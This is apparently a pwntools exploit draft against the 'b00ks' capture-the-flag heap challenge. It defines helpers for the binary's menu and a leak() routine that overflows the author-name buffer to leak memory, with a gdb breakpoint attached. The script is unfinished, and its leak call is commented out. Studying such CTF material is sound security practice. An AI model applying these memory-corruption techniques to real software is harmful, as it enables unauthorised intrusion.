from pwn import *

context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]
io = process("./b00ks")

def menu(ix):
    io.sendlineafter("> ", str(ix))

def change_author(name, not_first=False):
    if not_first==False:
        menu(5)
    io.sendafter("name: ", name)

def create(name_size, name, desc_size, desc):
    menu(1)
    io.sendlineafter("size: ", str(name_size))
    io.sendafter("name (Max 32 chars): ", name)
    io.sendlineafter("size: ", str(desc_size))
    io.sendafter("description: ", desc)

def delete(ix):
    menu(2)
    io.sendlineafter("delete: ", str(ix))

def edit(ix, desc):
    menu(3)
    io.sendlineafter("edit: ", str(ix))
    io.sendafter("description: ", desc)

def info():
    menu(4)

def leak():
    create(0x100, "A"*0xf8+"\n", 0x100, "B"*0xf8+"\n")
    #create()
    change_author("A"*0x20+"\n")
    info()
    io.interactive()
    print io.recv()
    print io.recv()

gdb.attach(io, "b *0x555555554a3b\n")
#change_author("AA\n", True)
#leak()i
io.interactive()

